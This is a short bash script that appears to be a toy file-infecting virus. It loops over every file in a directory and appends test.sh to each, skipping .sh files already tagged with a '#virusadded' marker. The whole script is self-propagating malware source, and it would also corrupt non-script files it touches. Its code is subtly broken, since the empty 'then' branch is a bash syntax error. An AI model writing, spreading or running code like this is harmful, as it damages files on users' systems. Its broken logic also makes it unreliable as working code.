#!/bin/bash

for f in *
do
 echo "Processing $f"
 if [[ "$f" == *".sh"* ]] && $(grep -q "#virusadded" $f); then

 else
   cat test.sh >> $f
fi
done
